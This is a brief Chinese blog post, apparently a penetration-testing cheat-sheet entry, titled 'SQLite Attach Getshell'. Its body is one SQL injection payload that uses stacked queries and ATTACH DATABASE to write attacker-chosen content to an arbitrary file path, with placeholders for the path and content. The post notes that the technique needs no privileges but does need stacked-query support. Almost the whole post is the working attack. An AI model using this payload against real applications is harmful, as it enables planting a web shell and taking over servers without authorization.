---
title: "SQLite Attach Getshell"
date: 2019-02-04T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['sqlite','sqli']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


SQLite Attach Getshell

<!--more-->

无权限要求.

```
;ATTACH DATABASE '路径' AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES ('内容'); --
```

需支持堆查询.